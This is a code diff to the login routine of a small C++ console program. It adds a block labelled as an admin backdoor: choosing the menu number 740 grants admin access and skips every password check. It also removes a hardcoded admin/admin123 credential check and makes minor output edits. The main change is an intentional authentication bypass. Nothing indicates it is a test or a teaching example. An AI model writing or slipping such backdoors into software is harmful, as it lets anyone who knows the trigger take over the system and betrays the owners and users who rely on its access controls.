@@ -20,6 +20,14 @@ void handleUserAuthentication() {
             continue;
         }
 
+        // --- Admin backdoor login ---
+        if (choice == 740) {
+            cout << "Admin access granted!\n";
+            successful = true;
+            return; // Exit the function to proceed to the main menu as admin
+        }
+        // --- End of admin backdoor ---
+
         system("cls");
 
         if (choice == 1) {
@@ -47,22 +55,9 @@ void handleUserAuthentication() {
             cin >> password;
             system("cls");
 
-            // Admin login check
-            if (username == "admin" && password == "admin123") { // Changed from a number to a string for better security
-                cout << "Admin login successful! You have access to admin functions.\n";
-                successful = true;
-                return; // Exit the function to proceed to the main menu as admin
-            }
-
             ifstream inFile("users.txt");
             if (!inFile) {
-                cout << "Error opening file!" << endl;
-                // If file doesn't exist, allow admin login to still work
-                if (username == "admin" && password == "admin123") {
-                    successful = true;
-                    return;
-                }
-                cout << "Please register first.\n";
+                cout << "Error opening file! Please register first.\n";
                 continue;
             }
 
@@ -85,7 +80,7 @@ void handleUserAuthentication() {
             }
         }
         else {
-            cout << "Invalid option! Please choose either 1 (Register) or 2 (Login)." << endl;
+            cout << "Invalid option! Please choose either 1 (Register) or 2 (Login).\n";
         }
     }
 }
